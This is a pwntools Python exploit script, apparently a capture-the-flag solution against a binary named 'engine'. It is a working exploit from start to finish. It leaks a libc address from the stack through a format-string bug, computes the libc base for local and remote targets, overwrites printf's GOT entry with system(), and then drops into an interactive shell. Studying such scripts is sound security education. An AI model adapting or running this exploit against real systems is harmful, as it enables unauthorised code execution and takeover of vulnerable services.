from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendlineafter(':', payload)
    io.recvuntil('(')
    result = io.recvuntil(') now')[:-5]
    return result


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './engine'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process(exe)

# Calculate format string offset, so we can use later in write operations
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Start program
io = start()

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local lib-c
stack_pos = 33  # %33$p is __libc_start_main+234 locally

# If executing remotely lets do a few things..
if args.REMOTE:
    # Update libc to version of the server, identified and downloaded using: https://libc.blukat.me
    libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
    # Offset of libc function we want to leak is different on the server
    stack_pos = 35  # %35$p is __libc_start_main+234 remotely


# Leak the __libc_start_main_ret function from the stack
leaked_addr = int(send_payload('%{}$p'.format(stack_pos)), 16)
info('leaked_libc_addr: %#x', leaked_addr)
# Calculate offsets - https://libc.blukat.me/?q=str_bin_sh%3A0x7f2863dcae1a%2Cprintf%3A0x7f2863c7bf70
# Update our libc library address
if args.REMOTE:
    libc.address = leaked_addr - (0x021bf7)  # Offset from libc-db
else:
    libc.address = leaked_addr - (libc.symbols['__libc_start_main'] + 234)
info('libc_base: %#x', libc.address)
info('system: %#x', libc.symbols.system)
info('got.printf: %#x', elf.got.printf)

# Overwrite got.printf address with address of system()
payload = fmtstr_payload(format_string.offset, {elf.got.printf: libc.symbols.system})
# payload = payload.replace(b'\x00', b'A')  # only ascii/numbers/special chars allowed
info(payload)
io.sendline(payload)

# Send 'sh' to the printf function we've overwritten with system()
# io.sendline('sh')

# Profit?
io.interactive()
